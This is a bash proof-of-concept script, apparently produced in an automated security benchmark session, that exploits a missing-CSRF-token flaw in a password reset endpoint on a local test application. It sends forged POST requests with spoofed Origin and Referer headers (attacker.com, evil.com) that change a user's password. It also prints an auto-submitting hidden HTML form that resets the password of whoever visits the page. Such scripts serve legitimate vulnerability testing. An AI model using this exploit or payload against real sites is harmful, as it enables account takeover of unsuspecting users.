#!/bin/bash
# POC: Bash script that demonstrates CSRF vulnerability on password reset endpoint through multiple attack vectors including origin manipulation and referer bypass
# Target: ./repo
# Created: 2025-11-04T14:51:45.705Z
# Session: benchmark-XBEN-027-24-mhknopkv

# CSRF Attack POC for Password Reset Endpoint
# This script demonstrates that the /password/[username] endpoint
# accepts requests without CSRF token validation, allowing attackers
# to perform password resets on behalf of authenticated users

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-8080}"
USERNAME="${3:-test}"
USER_ID="${4:-10031}"
TARGET_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "[*] CSRF Attack on Password Reset Endpoint"
echo "[*] Target: ${TARGET_URL}"
echo "[*] Username: ${USERNAME}"
echo "[*] User ID: ${USER_ID}"
echo ""

# Step 1: Check if password form exists and contains no CSRF tokens
echo "[*] Step 1: Checking password form for CSRF tokens..."
FORM_RESPONSE=$(curl -s "${TARGET_URL}/password/${USERNAME}")

if echo "${FORM_RESPONSE}" | grep -qi "csrf\|token"; then
    echo "[-] CSRF tokens found - endpoint appears protected"
    exit 1
else
    echo "[+] No CSRF tokens found in form - endpoint is vulnerable!"
fi

# Step 2: Demonstrate CSRF attack - submit password reset without CSRF token
echo ""
echo "[*] Step 2: Simulating cross-origin password reset request..."
echo "[*] Sending POST request with arbitrary Origin header (simulating attacker.com)..."

RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
    "${TARGET_URL}/password/${USERNAME}" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Origin: http://attacker.com" \
    -H "Referer: http://attacker.com/malicious-page" \
    -d "username=${USERNAME}&user_id=${USER_ID}&password=csrf_attacked")

HTTP_CODE=$(echo "${RESPONSE}" | tail -n1)
RESPONSE_BODY=$(echo "${RESPONSE}" | head -n-1)

echo "[+] Response Code: ${HTTP_CODE}"

if [ "${HTTP_CODE}" = "302" ] || [ "${HTTP_CODE}" = "200" ]; then
    echo "[+] SUCCESS! Password reset accepted from different origin!"
    echo "[+] Password changed to 'csrf_attacked' without CSRF token validation"
    echo "[+] This proves the endpoint is vulnerable to CSRF attacks"
else
    echo "[-] Request rejected (HTTP ${HTTP_CODE})"
    echo "${RESPONSE_BODY}"
    exit 1
fi

# Step 3: Demonstrate that no Referer validation occurs
echo ""
echo "[*] Step 3: Testing Referer header validation..."
echo "[*] Sending request WITHOUT Referer header..."

RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
    "${TARGET_URL}/password/${USERNAME}" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Origin: http://evil.com" \
    -d "username=${USERNAME}&user_id=${USER_ID}&password=csrf_no_referer")

HTTP_CODE=$(echo "${RESPONSE}" | tail -n1)

if [ "${HTTP_CODE}" = "302" ] || [ "${HTTP_CODE}" = "200" ]; then
    echo "[+] Request accepted without Referer header!"
    echo "[+] No Referer validation performed"
else
    echo "[-] Request rejected"
fi

# Step 4: Show vulnerable payload
echo ""
echo "[*] Step 4: Example CSRF payload (HTML form):"
echo ""
cat << 'EOF'
<!-- Attacker's malicious webpage -->
<form id="csrf-form" method="POST" action="http://localhost:8080/password/test">
  <input type="hidden" name="username" value="test">
  <input type="hidden" name="user_id" value="10031">
  <input type="hidden" name="password" value="csrf_attacked">
</form>
<script>
  // Auto-submit when authenticated user visits this page
  document.getElementById('csrf-form').submit();
</script>
EOF

echo ""
echo "[+] CSRF Vulnerability Confirmed!"
echo "[+] The password reset endpoint is vulnerable to cross-site request forgery"
echo "[+] An attacker can reset user passwords without CSRF token validation"